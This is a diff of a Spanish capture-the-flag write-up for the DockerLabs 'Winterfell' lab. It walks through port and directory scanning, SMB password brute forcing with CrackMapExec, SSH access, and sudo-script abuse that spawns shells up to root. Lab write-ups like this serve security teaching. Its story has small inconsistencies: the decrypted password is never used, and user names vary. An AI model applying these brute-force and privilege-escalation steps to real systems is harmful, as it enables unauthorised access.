@@ -1,83 +1,374 @@
-# WINTERFELL — DockerLabs
+# Winterfell — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** Zunderrub  
+**Fecha de creación:** 16/07/2024  
+**Técnicas:** Gobuster · SMB Enumeration · CrackMapExec · Caesar Cipher · SSH · Python sudo abuse · Writable script
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **WINTERFELL** de DockerLabs.
-
----
-
-## 1. Reconocimiento
-
-Vamos a desplegar la maquina vulnerable.
-
-Haremos un escaneo profundo de la maquina para ver sus puertos abiertos.
-
-Vemos que cuenta con un servidor web, smb y ssh, así que primero miraremos la
-pagina web que aloja.
-
-Como no encontramos nada interesante, utilizaremos gobuster para hacer un
-escaneo de directorios escondidos.
-
-## 2. Enumeración
-
-Nos encontramos con /dragón, asi que lo miraremos.
-
-Vemos que tiene varios nombres de películas, están juntos así que supongo que
-serán contraseñas
-
-Con los nombres que nos aparece en la web principal hacemos dos ficheros para
-hacer un ataque de fuerza bruta.
-
-Vamos a ver que directorios cuenta el servidor smb
-
-## 3. Explotación
-
-Y ahora con crackmapexec haremos un ataque de fuerza bruta para encontrar un
-usuario y contraseña
-
-Nos registramos como jon y su contraseña
-
-Listamos y vemos que tenemos un fichero, lo pasaremos a nuestra maquina host y
-lo miraremos.
-
-Tenemos un cifrado
-
-## 4. Post-explotación
-
-Utilizaremos cyberchef para descifrarlo.
-
-Ahora nos conectamos como jon por ssh y haremos la escalada de privilegios.
-
-Vemos que tenemos permisos para ejecutar como el usuario aria un script de
-Python.
-
-Lo vamos a eliminar y crear uno nuevo con el mismo nombre.
-
-## 5. Escalada de privilegios
-
-Lo hacemos ejecutable y luego lo ejecutamos y vemos que somos el usuario aria.
-
-Ahora hacemos igual un sudo -l y encontramos con el usuario daenerys que puede
-listar y ver.
-
-Tenemos la contraseña de esta usuaria.
-
-Una vez dentro vemos que tiene permisos para ejecutar como sudo un fichero
-oculto llamado .shell.sh
-
-## 6. Lección aprendida
-
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
-
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — directorio oculto](#2-enumeración-web--directorio-oculto)
+3. [Enumeración SMB y fuerza bruta](#3-enumeración-smb-y-fuerza-bruta)
+4. [Descifrado de credenciales](#4-descifrado-de-credenciales)
+5. [Acceso SSH — usuario jon](#5-acceso-ssh--usuario-jon)
+6. [Escalada horizontal — usuario aria](#6-escalada-horizontal--usuario-aria)
+7. [Escalada horizontal — usuario daenerys](#7-escalada-horizontal--usuario-daenerys)
+8. [Escalada final a root](#8-escalada-final-a-root)
+9. [Lección aprendida](#9-lección-aprendida)
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 1. Despliegue y reconocimiento
+
+Desplegamos la máquina vulnerable:
+
+```bash
+sudo bash auto_deploy.sh winterfell.tar
+```
+
+> IP asignada: `172.17.0.2`
+
+Realizamos un escaneo profundo:
+
+```bash
+sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
+```
+
+Resultado:
+
+```text
+22/tcp open ssh
+80/tcp open http
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+```
+
+---
+
+## 2. Enumeración web — directorio oculto
+
+Accedemos al servidor web y observamos una página temática de *Juego de Tronos*.
+
+Enumeramos directorios ocultos:
+
+```bash
+gobuster dir -u http://172.17.0.2 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-x php,html,py,txt -t 100
+```
+
+Resultado:
+
+```text
+/dragon
+```
+
+Exploramos:
+
+```text
+http://172.17.0.2/dragon
+```
+
+Encontramos el fichero:
+
+```text
+EpisodiosT1
+```
+
+Contenido:
+
+```text
+seacercaelinvierno
+elcaminoreal
+lordnieve
+...
+```
+
+Los textos parecen posibles contraseñas.
+
+Creamos dos listas:
+
+```bash
+cat users.txt
+```
+
+```text
+jon
+arya
+daenerys
+```
+
+```bash
+cat passwords.txt
+```
+
+```text
+seacercaelinvierno
+elcaminoreal
+lordnieve
+...
+```
+
+---
+
+## 3. Enumeración SMB y fuerza bruta
+
+Enumeramos recursos SMB:
+
+```bash
+smbclient -N -L //172.17.0.2
+```
+
+Resultado:
+
+```text
+print$
+shared
+IPC$
+```
+
+Realizamos fuerza bruta con CrackMapExec:
+
+```bash
+crackmapexec smb 172.17.0.2 \
+-u users.txt \
+-p passwords.txt
+```
+
+Resultado:
+
+```text
+jon : seacercaelinvierno
+```
+
+Accedemos al recurso compartido:
+
+```bash
+smbclient -U 'jon' //172.17.0.2/shared
+```
+
+Listamos archivos:
+
+```bash
+ls
+```
+
+Encontramos:
+
+```text
+proteccion_del_reino
+```
+
+Descargamos el fichero:
+
+```bash
+get proteccion_del_reino
+```
+
+---
+
+## 4. Descifrado de credenciales
+
+Leemos el contenido:
+
+```bash
+cat proteccion_del_reino
+```
+
+Resultado:
+
+```text
+Esta es mi contraseña, se encuentra cifrada en ese lenguaje...
+```
+
+El texto contiene una contraseña cifrada.
+
+Utilizamos CyberChef para descifrarla.
+
+Herramienta utilizada:
+
+[CyberChef](https://gchq.github.io/CyberChef/?utm_source=chatgpt.com)
+
+Resultado obtenido:
+
+```text
+HijoDeLaNoche
+```
+
+---
+
+## 5. Acceso SSH — usuario jon
+
+Accedemos mediante SSH:
+
+```bash
+ssh jon@172.17.0.2
+```
+
+Contraseña:
+
+```text
+seacercaelinvierno
+```
+
+Comprobamos privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(aria) NOPASSWD: /usr/bin/python3 /home/jon/.mensaje.py
+```
+
+---
+
+## 6. Escalada horizontal — usuario aria
+
+Eliminamos el script original:
+
+```bash
+rm -r .mensaje.py
+```
+
+Creamos uno nuevo:
+
+```python
+import os
+os.system("/bin/sh")
+```
+
+Damos permisos:
+
+```bash
+chmod +x .mensaje.py
+```
+
+Ejecutamos como `aria`:
+
+```bash
+sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py
+```
+
+Verificamos usuario:
+
+```bash
+whoami
+aria
+```
+
+---
+
+## 7. Escalada horizontal — usuario daenerys
+
+Comprobamos nuevos privilegios:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(daenerys) NOPASSWD: /usr/bin/cat /home/daenerys/mensajeParaJon
+```
+
+Leemos el fichero:
+
+```bash
+sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon
+```
+
+Resultado:
+
+```text
+drakaris!
+```
+
+Cambiamos al usuario:
+
+```bash
+su daenerys
+```
+
+Contraseña:
+
+```text
+drakaris!
+```
+
+Comprobamos privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(root) NOPASSWD: /usr/bin/bash /home/daenerys/.secret/.shell.sh
+```
+
+---
+
+## 8. Escalada final a root
+
+Editamos el script permitido:
+
+```bash
+nano /home/daenerys/.secret/.shell.sh
+```
+
+Contenido añadido:
+
+```bash
+#!/bin/bash
+bash -p
+```
+
+Ejecutamos como root:
+
+```bash
+sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh
+```
+
+Verificamos privilegios:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
+
+---
+
+## 9. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Directorios ocultos accesibles | Filtración de contraseñas |
+| SMB expuesto | Acceso a archivos sensibles |
+| Contraseñas débiles/reutilizadas | Acceso SSH |
+| Script Python ejecutable con sudo | Escalada horizontal |
+| Script Bash editable ejecutado como root | Escalada final a root |
+
+**Para defenderse:**
+
+- Restringir acceso a recursos SMB innecesarios.
+- Aplicar políticas robustas de contraseñas.
+- No almacenar secretos en archivos accesibles.
+- Proteger scripts ejecutados mediante sudo.
+- Auditar permisos sobre archivos críticos.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
